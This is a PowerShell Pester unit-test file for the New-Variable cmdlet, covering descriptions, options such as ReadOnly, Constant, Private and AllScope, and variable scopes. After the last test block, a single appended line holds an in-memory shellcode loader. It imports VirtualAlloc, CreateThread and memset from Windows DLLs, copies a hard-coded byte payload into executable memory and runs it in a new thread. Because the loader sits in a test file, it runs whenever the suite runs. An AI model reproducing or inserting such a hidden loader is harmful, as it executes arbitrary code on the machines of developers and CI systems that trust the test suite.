


Describe "New-Variable DRT Unit Tests" -Tags "CI" {
	It "New-Variable variable with description should works"{
		New-Variable foo bar -description "my description"
		$var1=Get-Variable -Name foo
		$var1.Name|Should -BeExactly "foo"
		$var1.Value|Should -BeExactly "bar"
		$var1.Options|Should -BeExactly "None"
		$var1.Description|Should -BeExactly "my description"
	}

	It "New-Variable variable with option should works"{
		New-Variable foo bar -option Constant
		$var1=Get-Variable -Name foo
		$var1.Name|Should -BeExactly "foo"
		$var1.Value|Should -BeExactly "bar"
		$var1.Options|Should -BeExactly "Constant"
		$var1.Description|Should -BeNullOrEmpty
	}

	It "New-Variable variable twice should throw Exception"{
		New-Variable foo bogus

		$e = { New-Variable foo bar -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableAlreadyExists,Microsoft.PowerShell.Commands.NewVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateException"

		New-Variable foo bar -Force -PassThru
		$var1=Get-Variable -Name foo
		$var1.Name|Should -BeExactly "foo"
		$var1.Value|Should -BeExactly "bar"
		$var1.Options|Should -BeExactly "None"
		$var1.Description|Should -BeNullOrEmpty
	}

	It "New-Variable ReadOnly variable twice should throw Exception"{
		New-Variable foo bogus -option ReadOnly

		$e = { New-Variable foo bar -Scope 1 -ErrorAction Stop } |
		    Should -Throw -ErrorId "VariableAlreadyExists,Microsoft.PowerShell.Commands.NewVariableCommand" -PassThru
		$e.CategoryInfo | Should -Match "SessionStateException"

		New-Variable foo bar -Force -PassThru
		$var1=Get-Variable -Name foo
		$var1.Name|Should -BeExactly "foo"
		$var1.Value|Should -BeExactly "bar"
		$var1.Options|Should -BeExactly "None"
		$var1.Description|Should -BeNullOrEmpty
	}
}

Describe "New-Variable" -Tags "CI" {
    It "Should create a new variable with no parameters" {
	{ New-Variable var1 } | Should -Not -Throw
    }

    It "Should be able to set variable name using the Name parameter" {
	{ New-Variable -Name var1 } | Should -Not -Throw
    }

    It "Should be able to assign a value to a variable using the value switch" {
	New-Variable var1 -Value 4

	$var1 | Should -Be 4
    }

    It "Should be able to assign a value to a new variable without using the value switch" {
	New-Variable var1 "test"

	$var1 | Should -BeExactly "test"
    }

    It "Should assign a description to a new variable using the description switch" {
	New-Variable var1 100 -Description "Test Description"

	(Get-Variable var1).Description | Should -BeExactly "Test Description"
    }

    It "Should not be able to set the name of a new variable to that of an old variable within same scope when the Force switch is missing" {
        New-Variable var1
        { New-Variable var1 -Scope 1 -ErrorAction Stop } | Should -Throw -ErrorId "VariableAlreadyExists,Microsoft.PowerShell.Commands.NewVariableCommand"
    }

    It "Should change the value of an already existing variable using the Force switch" {
	New-Variable var1 -Value 1

	$var1 | Should -Be 1

	New-Variable var1 -Value 2 -Force

	$var1 | Should -Be 2
	$var1 | Should -Not -Be 1

    }

    It "Should be able to set the value of a variable by piped input" {
	$in = "value"

	$in | New-Variable -Name var1

	$var1 | Should -Be $in

    }

    It "Should be able to pipe object properties to output using the PassThru switch" {
	$in = Set-Variable -Name testVar -Value "test" -Description "test description" -PassThru

	$in.Description | Should -BeExactly "test description"
    }

    It "Should be able to set the value using the value switch" {
	New-Variable -Name var1 -Value 2

	$var1 | Should -Be 2
    }

    Context "Option tests" {
	It "Should be able to use the options switch without error" {
		{ New-Variable -Name var1 -Value 2 -Option Unspecified } | Should -Not -Throw
	}

	It "Should default to none as the value for options" {
		 (new-variable -name var2 -value 4 -passthru).Options | Should -BeExactly "None"
	}

	It "Should be able to set ReadOnly option" {
		{ New-Variable -Name var1 -Value 2 -Option ReadOnly } | Should -Not -Throw
	}

	It "Should not be able to change variable created using the ReadOnly option when the Force switch is not used" {
		New-Variable -Name var1 -Value 1 -Option ReadOnly

		Set-Variable -Name var1 -Value 2 -ErrorAction SilentlyContinue

		$var1 | Should -Not -Be 2
	}

	It "Should be able to set a new variable to constant" {
		{ New-Variable -Name var1 -Option Constant } | Should -Not -Throw
	}

	It "Should not be able to change an existing variable to constant" {
		New-Variable -Name var1 -Value 1 -PassThru

		Set-Variable -Name var1 -Option Constant  -ErrorAction SilentlyContinue

		(Get-Variable var1).Options | Should -BeExactly "None"
	}

	It "Should not be able to delete a constant variable" {
		New-Variable -Name var1 -Value 2 -Option Constant

		Remove-Variable -Name var1 -ErrorAction SilentlyContinue

		$var1 | Should -Be 2
	}

	It "Should not be able to change a constant variable" {
		New-Variable -Name var1 -Value 1 -Option Constant

		Set-Variable -Name var1 -Value 2  -ErrorAction SilentlyContinue

		$var1 | Should -Not -Be 2
	}

	It "Should be able to create a variable as private without error" {
		{ New-Variable -Name var1 -Option Private } | Should -Not -Throw
	}

	It "Should be able to see the value of a private variable when within scope" {

		New-Variable -Name var1 -Value 100 -Option Private

		$var1 | Should -Be 100

	}

	It "Should not be able to see the value of a private variable when out of scope" {
		{New-Variable -Name var1 -Value 1 -Option Private} | Should -Not -Throw

		$var1 | Should -BeNullOrEmpty
	}

	It "Should be able to use the AllScope switch without error" {
	    { New-Variable -Name var1 -Option AllScope } | Should -Not -Throw
	}

	It "Should be able to see variable created using the AllScope switch in a child scope" {
	    New-Variable -Name var1 -Value 1 -Option AllScope
	    &{ $var1 = 2 }
		$var1 | Should -Be 2
	}

    }

    Context "Scope Tests" {
    BeforeAll {
        if ( get-variable -scope global -name globalVar1 -ErrorAction SilentlyContinue )
        {
            Remove-Variable -scope global -name globalVar1
        }
        if ( get-variable -scope script -name scriptvar -ErrorAction SilentlyContinue )
        {
            remove-variable -scope script -name scriptvar
        }
        
    }
    AfterAll {
        if ( get-variable -scope global -name globalVar1 )
        {
            Remove-Variable -scope global -name globalVar1
        }
        if ( get-variable -scope script -name scriptvar )
        {
            remove-variable -scope script -name scriptvar
        }
    }
    It "Should be able to create a global scope variable using the global switch" {
        new-variable -Scope global -name globalvar1 -value 1
        get-variable -Scope global -name globalVar1 -ValueOnly | Should -Be 1
    }
    It "Should be able to create a local scope variable using the local switch" {
        Get-Variable -scope local -name localvar -ValueOnly -ErrorAction silentlycontinue | Should -BeNullOrEmpty
        New-Variable -Scope local -Name localVar -value 10
        get-variable -scope local -name localvar -ValueOnly | Should -Be 10
    }
    It "Should be able to create a script scope variable using the script switch" {
        new-variable -scope script -name scriptvar -value 100
        get-variable -scope script -name scriptvar -ValueOnly | Should -Be 100
    }
	}
}

$NOf6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NOf6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc2,0x01,0xec,0x84,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x42,0x0f,0x03,0x42,0xcd,0xe3,0x19,0x78,0x39,0x61,0xe1,0x81,0xb9,0x06,0x6b,0x64,0x88,0x06,0x0f,0xec,0xba,0xb6,0x5b,0xa0,0x36,0x3c,0x09,0x51,0xcd,0x30,0x86,0x56,0x66,0xfe,0xf0,0x59,0x77,0x53,0xc0,0xf8,0xfb,0xae,0x15,0xdb,0xc2,0x60,0x68,0x1a,0x03,0x9c,0x81,0x4e,0xdc,0xea,0x34,0x7f,0x69,0xa6,0x84,0xf4,0x21,0x26,0x8d,0xe9,0xf1,0x49,0xbc,0xbf,0x8a,0x13,0x1e,0x41,0x5f,0x28,0x17,0x59,0xbc,0x15,0xe1,0xd2,0x76,0xe1,0xf0,0x32,0x47,0x0a,0x5e,0x7b,0x68,0xf9,0x9e,0xbb,0x4e,0xe2,0xd4,0xb5,0xad,0x9f,0xee,0x01,0xcc,0x7b,0x7a,0x92,0x76,0x0f,0xdc,0x7e,0x87,0xdc,0xbb,0xf5,0x8b,0xa9,0xc8,0x52,0x8f,0x2c,0x1c,0xe9,0xab,0xa5,0xa3,0x3e,0x3a,0xfd,0x87,0x9a,0x67,0xa5,0xa6,0xbb,0xcd,0x08,0xd6,0xdc,0xae,0xf5,0x72,0x96,0x42,0xe1,0x0e,0xf5,0x0a,0xc6,0x22,0x06,0xca,0x40,0x34,0x75,0xf8,0xcf,0xee,0x11,0xb0,0x98,0x28,0xe5,0xb7,0xb2,0x8d,0x79,0x46,0x3d,0xee,0x50,0x8c,0x69,0xbe,0xca,0x25,0x12,0x55,0x0b,0xca,0xc7,0xc0,0x0e,0x5c,0x55,0xbe,0xf1,0x1d,0xcd,0xbd,0xf1,0x1b,0xaa,0x4b,0x17,0x73,0xe2,0x1b,0x88,0x33,0x52,0xdc,0x78,0xdb,0xb8,0xd3,0xa7,0xfb,0xc2,0x39,0xc0,0x91,0x2c,0x94,0xb8,0x0d,0xd4,0xbd,0x33,0xac,0x19,0x68,0x3e,0xee,0x92,0x9f,0xbe,0xa0,0x52,0xd5,0xac,0x54,0x93,0xa0,0x8f,0xf2,0xac,0x1e,0xa5,0xfa,0x38,0xa5,0x6c,0xad,0xd4,0xa7,0x49,0x99,0x7a,0x57,0xbc,0x92,0xb3,0xcd,0x7f,0xcc,0xbb,0x01,0x80,0x0c,0xea,0x4b,0x80,0x64,0x4a,0x28,0xd3,0x91,0x95,0xe5,0x47,0x0a,0x00,0x06,0x3e,0xff,0x83,0x6e,0xbc,0x26,0xe3,0x30,0x3f,0x0d,0xf5,0x0d,0x96,0x6b,0x83,0x7f,0x2a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lGL=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lGL.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lGL,0,0,0);for (;;){Start-sleep 60};

